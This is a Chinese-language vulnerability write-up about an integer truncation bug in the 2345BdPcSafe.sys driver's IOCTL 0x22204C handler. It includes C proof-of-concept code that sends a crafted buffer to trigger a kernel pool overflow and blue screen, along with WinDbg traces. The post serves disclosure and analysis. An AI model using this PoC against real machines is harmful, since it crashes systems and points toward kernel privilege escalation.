# 漏洞概述

  * 软件网址：<http://safe.2345.cc/>

  * 版本：v3.7 X64

2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。

# 漏洞分析

在`IRP_MJ_DEVICE_CONTROL`处理函数中，对`0x22204C`接口进行处理时，有一段拷贝字符串的操作如下所示：

![img](http://wx2.sinaimg.cn/mw690/006mu4nKly1ft5604o35nj30jn04k0so.jpg)

    
    
    struct _ioctl_buf
    
    {
    
      WORD len;
    
      WORD len_;
    
      DWORD unk2;
    
      _ioctl_buf_str *ptr;
    
    };
    
    struct _ioctl_buf_str
    
    {
    
      wchar_t buf[1];
    
    };
    

`a2`是一个`_ioctl_buf`结构（由应用层输入构造而成），`len2`是输入的另一个字符串的长度，通过`a2->len`（2字节）和`len2`（2字节）计算得到`len1`，关键在于`len1`是也一个`WORD`变量，只有2字节，所以当`a2->len+len2`的大小超过`WORD`溢出之后，会被截断成`WORD`，截断后的值赋给`len1`，此时就可能导致`len1`的值反而小于`a2->len`。比如：

    
    
    0xa3d0 + 0xb4f0 = 0x158C0 =>截断=> 0x58C0
    
    0x58C0 < 0xa3d0
    

接着根据`len1`分配内存`p`，`memmove`拷贝`a2->ptr`内容到`p`中，长度按`a2->len`，问题就来了，`a2-len`大于`len1`时，就会导致拷贝溢出，`bsod`（写溢出，可控制内容，可以做更多的利用了，这里我不擅长了）。

好了，漏洞成因这里就分析完了。

下面看一下`poc`：

    
    
    int poc()
    
    {
    
    DWORD BytesReturned = 0;
    
    HANDLE h = OpenDevice("\\\\.\\2345BdPcSafe");
    
    if (h == INVALID_HANDLE_VALUE) {
    
    return 1;
    
    }
    
        //过白名单检查
    
    if (!BypassChk(h)) {
    
    return 1;
    
    }
    
    //BSOD
    
    DWORD ctlcode = 0x22204C;
    
    #pragma pack(push, 1)
    
    struct _ioctl_buf_in
    
    {
    
    DWORD unk1;
    
    DWORD unk2;//4
    
    DWORD offset1;//8 =0x18
    
    DWORD offset2;//c =A3E8
    
    DWORD offset3;//10
    
    DWORD unk3;//14
    
    char buf1[0xa3d0];//18
    
    char buf2[0xb4f0];//18+a3d0 
    
    }; //0x158D8
    
    #pragma pack(pop)
    
    _ioctl_buf_in buff = { 0 };
    
    buff.unk1 = 4;
    
    buff.unk3 = 4;
    
    buff.offset1 = 0x18;
    
    buff.offset2 = (char*)&buff.buf2 - (char*)&ampbuff
    
    buff.offset3 = 0;
    
    memset(buff.buf1, 0x41, 0xa3d0);
    
    memset(buff.buf2, 0x41, 0xb4f0);
    
    if(!DeviceIoControl(h, ctlcode, &buff, sizeof(_ioctl_buf_in), &buff, 0, &BytesReturned, NULL)) {
    
    printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
    
    }
    
    return 0;
    
    }
    

其中`buff.buf1`和`buff.buf2`的长度`0xa3d0 + 0xb4f0 =
0x158c0`（截断）就是`a2->len`(`0x58c0`)，`buff.buf2`的长度`b4f0`就是`len2`。

我们在调试中看一下计算结果，可以清晰看到`len1=0xdb2 < 0x58c0(a2->len)`。

    
    
    0: kd> p
    
    2345BdPcSafe+0x561c:
    
    fffff880`0540561c 660307          add     ax,word ptr [rdi]
    
    0: kd> r rdi
    
    rdi=fffffa8026539658
    
    0: kd> dw fffffa8026539658 l1
    
    fffffa80`26539658  58c0
    
    //a2->len = 0x58c0
    
    0: kd> p
    
    2345BdPcSafe+0x561f:
    
    fffff880`0540561f 664103c1        add     ax,r9w
    
    0: kd> r rax
    
    rax=00000000000058c2
    
    //len2 = 0xb4f0
    
    0: kd> r r9
    
    r9=000000000000b4f0
    
    0: kd> p
    
    2345BdPcSafe+0x5623:
    
    fffff880`05405623 0fb7d0          movzx   edx,ax
    
    0: kd> r rax
    
    rax=0000000000000db2
    
    //len1 = 0xdb2
    
    0: kd> p
    
    2345BdPcSafe+0x562a:
    
    fffff880`0540562a ff15b80e0300    call    qword ptr [2345BdPcSafe+0x364e8 (fffff880`054364e8)]
    
    0: kd> dq fffff880`054364e8 l1
    
    fffff880`054364e8  fffff800`03ff70e0
    
    0: kd> u fffff800`03ff70e0
    
    nt!ExAllocatePoolWithTag:
    
    fffff800`03ff70e0 fff5            push    rbp
    
    0: kd> r rcx;r rdx;r r8
    
    rcx=0000000000000001
    
    rdx=0000000000000db2
    
    r8=0000000035343332
    
    //参数：p = ExAllocatePoolWithTag(1, 0xdb2, 0x35343332);
    

# 结语

这个漏洞主要是对输入参数结构体的长度字段校验不够严谨，导致变量溢出截断出现意外的大小结果导致了漏洞的产生。

该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！

博客原文：<https://anhkgg.github.io/vul-2345-3/>

欢迎关注公众号（汉客儿）：[公众号推送连接](https://mp.weixin.qq.com/s?__biz=MzI1NTUzMjUzMQ==&mid=2247483808&idx=1&sn=5a18e557b4f52f43b4bb8794d9e8aa67&chksm=ea35cd3cdd42442ab64ae96e4098ef6e5067786b0099d243f90a5d8383609769f37c7a3a870b#rd)

